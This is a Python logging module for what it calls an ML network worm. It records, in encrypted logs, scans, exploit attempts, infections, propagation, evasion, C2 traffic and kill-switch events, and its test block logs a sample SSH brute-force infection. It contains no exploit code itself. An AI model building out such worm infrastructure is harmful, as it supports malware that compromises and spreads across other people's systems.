"""
ML Network Worm - Logging System
Comprehensive logging with encryption and audit trail
"""

import os
import json
import logging
from datetime import datetime
from typing import Dict, Any, Optional
from pathlib import Path
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class WormLogger:
    """Advanced logging system for the worm"""
    
    def __init__(self, log_dir: str = "logs", encrypt: bool = True):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        self.encrypt = encrypt
        
        # Generate or load encryption key
        self.key_file = self.log_dir / ".key"
        if encrypt:
            self.key = self._get_or_create_key()
            self.cipher = Fernet(self.key)
        
        # Create log files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"worm_{timestamp}.log"
        self.json_log_file = self.log_dir / f"worm_{timestamp}.json"
        
        # Setup Python logger
        self.logger = logging.getLogger("MLWorm")
        self.logger.setLevel(logging.DEBUG)
        
        # File handler
        fh = logging.FileHandler(self.log_file)
        fh.setLevel(logging.DEBUG)
        
        # Console handler with colors
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        
        # JSON log for structured data
        self.json_logs = []
        
        self.info("Logger initialized", {"log_dir": str(self.log_dir)})
    
    def _get_or_create_key(self) -> bytes:
        """Get existing key or create new one"""
        if self.key_file.exists():
            with open(self.key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            return key
    
    def _log_json(self, level: str, message: str, data: Optional[Dict[str, Any]] = None):
        """Log structured JSON data"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message,
            "data": data or {}
        }
        self.json_logs.append(log_entry)
        
        # Write to file
        with open(self.json_log_file, 'a') as f:
            json_line = json.dumps(log_entry) + "\n"
            if self.encrypt:
                json_line = self.cipher.encrypt(json_line.encode()).decode() + "\n"
            f.write(json_line)
    
    def debug(self, message: str, data: Optional[Dict[str, Any]] = None):
        """Log debug message"""
        self.logger.debug(message)
        self._log_json("DEBUG", message, data)
    
    def info(self, message: str, data: Optional[Dict[str, Any]] = None):
        """Log info message"""
        print(f"{Fore.CYAN}[INFO] {message}{Style.RESET_ALL}")
        self.logger.info(message)
        self._log_json("INFO", message, data)
    
    def success(self, message: str, data: Optional[Dict[str, Any]] = None):
        """Log success message"""
        print(f"{Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
        self.logger.info(f"SUCCESS: {message}")
        self._log_json("SUCCESS", message, data)
    
    def warning(self, message: str, data: Optional[Dict[str, Any]] = None):
        """Log warning message"""
        print(f"{Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
        self.logger.warning(message)
        self._log_json("WARNING", message, data)
    
    def error(self, message: str, data: Optional[Dict[str, Any]] = None):
        """Log error message"""
        print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        self.logger.error(message)
        self._log_json("ERROR", message, data)
    
    def critical(self, message: str, data: Optional[Dict[str, Any]] = None):
        """Log critical message"""
        print(f"{Fore.RED}{Style.BRIGHT}[CRITICAL] {message}{Style.RESET_ALL}")
        self.logger.critical(message)
        self._log_json("CRITICAL", message, data)
    
    # Specialized logging methods for worm activities
    
    def log_scan(self, target: str, result: str, data: Optional[Dict[str, Any]] = None):
        """Log scanning activity"""
        self.info(f"Scan: {target} - {result}", {
            "activity": "scan",
            "target": target,
            "result": result,
            **(data or {})
        })
    
    def log_exploit(self, target: str, exploit: str, success: bool, data: Optional[Dict[str, Any]] = None):
        """Log exploitation attempt"""
        level = "success" if success else "warning"
        msg = f"Exploit: {exploit} on {target} - {'SUCCESS' if success else 'FAILED'}"
        
        log_data = {
            "activity": "exploit",
            "target": target,
            "exploit": exploit,
            "success": success,
            **(data or {})
        }
        
        if success:
            self.success(msg, log_data)
        else:
            self.warning(msg, log_data)
    
    def log_infection(self, target: str, method: str, data: Optional[Dict[str, Any]] = None):
        """Log successful infection"""
        self.success(f"Infected: {target} via {method}", {
            "activity": "infection",
            "target": target,
            "method": method,
            **(data or {})
        })
    
    def log_propagation(self, source: str, target: str, data: Optional[Dict[str, Any]] = None):
        """Log propagation event"""
        self.info(f"Propagating: {source} -> {target}", {
            "activity": "propagation",
            "source": source,
            "target": target,
            **(data or {})
        })
    
    def log_evasion(self, technique: str, result: str, data: Optional[Dict[str, Any]] = None):
        """Log evasion technique"""
        self.info(f"Evasion: {technique} - {result}", {
            "activity": "evasion",
            "technique": technique,
            "result": result,
            **(data or {})
        })
    
    def log_c2(self, action: str, data: Optional[Dict[str, Any]] = None):
        """Log C2 communication"""
        self.debug(f"C2: {action}", {
            "activity": "c2",
            "action": action,
            **(data or {})
        })
    
    def log_ml_decision(self, model: str, decision: str, confidence: float, data: Optional[Dict[str, Any]] = None):
        """Log ML model decision"""
        self.info(f"ML Decision: {model} - {decision} (confidence: {confidence:.2f})", {
            "activity": "ml_decision",
            "model": model,
            "decision": decision,
            "confidence": confidence,
            **(data or {})
        })
    
    def log_kill_switch(self, reason: str):
        """Log kill switch activation"""
        self.critical(f"KILL SWITCH ACTIVATED: {reason}", {
            "activity": "kill_switch",
            "reason": reason
        })
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get statistics from logs"""
        stats = {
            "total_logs": len(self.json_logs),
            "scans": 0,
            "exploits": 0,
            "infections": 0,
            "successful_exploits": 0,
            "failed_exploits": 0,
            "evasions": 0,
            "c2_communications": 0,
            "ml_decisions": 0
        }
        
        for log in self.json_logs:
            data = log.get("data", {})
            activity = data.get("activity", "")
            
            if activity == "scan":
                stats["scans"] += 1
            elif activity == "exploit":
                stats["exploits"] += 1
                if data.get("success"):
                    stats["successful_exploits"] += 1
                else:
                    stats["failed_exploits"] += 1
            elif activity == "infection":
                stats["infections"] += 1
            elif activity == "evasion":
                stats["evasions"] += 1
            elif activity == "c2":
                stats["c2_communications"] += 1
            elif activity == "ml_decision":
                stats["ml_decisions"] += 1
        
        return stats
    
    def export_logs(self, output_file: str):
        """Export all logs to a file"""
        with open(output_file, 'w') as f:
            json.dump(self.json_logs, f, indent=2)
        self.info(f"Logs exported to {output_file}")
    
    def decrypt_log_file(self, encrypted_file: str, output_file: str):
        """Decrypt an encrypted log file"""
        if not self.encrypt:
            self.error("Encryption not enabled")
            return
        
        with open(encrypted_file, 'r') as f:
            encrypted_lines = f.readlines()
        
        decrypted_logs = []
        for line in encrypted_lines:
            try:
                decrypted = self.cipher.decrypt(line.strip().encode()).decode()
                decrypted_logs.append(json.loads(decrypted))
            except Exception as e:
                self.error(f"Failed to decrypt line: {e}")
        
        with open(output_file, 'w') as f:
            json.dump(decrypted_logs, f, indent=2)
        
        self.info(f"Decrypted logs saved to {output_file}")


# Global logger instance
logger = WormLogger()


if __name__ == "__main__":
    # Test logging
    logger.info("Testing logger")
    logger.log_scan("192.168.1.100", "Host alive", {"ports": [22, 80]})
    logger.log_exploit("192.168.1.100", "SSH_BruteForce", True, {"username": "admin"})
    logger.log_infection("192.168.1.100", "SSH", {"os": "Linux"})
    
    print("\nStatistics:")
    print(json.dumps(logger.get_statistics(), indent=2))
